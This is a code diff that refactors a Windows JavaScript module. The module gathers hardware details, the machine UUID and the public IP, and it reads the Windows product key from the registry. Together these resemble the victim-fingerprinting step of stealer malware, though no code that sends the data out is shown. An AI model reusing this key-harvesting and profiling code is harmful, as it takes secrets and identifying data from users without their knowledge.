@@ -14,8 +14,7 @@ const getDisk = async () => {
 
 const getTotalMemory = async () => {
     try {
-        let t = await getCommand("wmic computersystem get totalphysicalmemory | more +1");
-        return parseInt(Math.floor(parseInt(t) / (1024 * 1024 * 1024)));
+        return parseInt(Math.floor(parseInt(await getCommand("wmic computersystem get totalphysicalmemory | more +1")) / (1024 * 1024 * 1024)));
     } catch (e) {
         console.error(e);
         return "4";
@@ -24,8 +23,7 @@ const getTotalMemory = async () => {
 
 const getCleanUUID = async () => {
     try {
-        let u = await getCommand("wmic csproduct get uuid"),
-            m = u.match(/UUID\s+([A-Fa-f0-9-]+)/);
+        let m = (await getCommand("wmic csproduct get uuid")).match(/UUID\s+([A-Fa-f0-9-]+)/);
         return m ? m[1] : "Not found";
     } catch (e) {
         console.error(e);
@@ -33,10 +31,9 @@ const getCleanUUID = async () => {
     }
 }
 
-const getCommand = async c => {
+const getCommand = async (c) => {
     try {
-        let { stdout } = await exec(c);
-        return stdout.trim();
+        return (await exec(c)).stdout.trim();
     } catch (e) {
         console.error(e);
         return "";
@@ -45,8 +42,7 @@ const getCommand = async c => {
 
 const getCpuCount = async () => {
     try {
-        let s = await getCommand("echo %NUMBER_OF_PROCESSORS%"),
-            c = parseInt(s);
+        let c = parseInt(await getCommand("echo %NUMBER_OF_PROCESSORS%"));
         return isNaN(c) ? "4" : c.toString();
     } catch (e) {
         console.error(e);
@@ -56,8 +52,7 @@ const getCpuCount = async () => {
 
 const getInfo = async () => {
     try {
-        const [DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION] =
-            await Promise.all([getDisk(), getTotalMemory(), getCleanUUID(), getCpuCount(), getCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"), getCommand("wmic OS get caption, osarchitecture | more +1"), getCommand("wmic cpu get name | more +1"), getCommand("wmic PATH Win32_VideoController get name | more +1"), getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"), getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")]);
+        const [DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION] = await Promise.all([getDisk(), getTotalMemory(), getCleanUUID(), getCpuCount(), getCommand("powershell.exe (Resolve-DnsName -Name myip.opendns.com -Server 208.67.222.220).IPAddress"), getCommand("wmic OS get caption, osarchitecture | more +1"), getCommand("wmic cpu get name | more +1"), getCommand("wmic PATH Win32_VideoController get name | more +1"), getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"), getCommand("powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion' -Name ProductName")]);
         return { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION }
     } catch (e) {
         console.error(e);
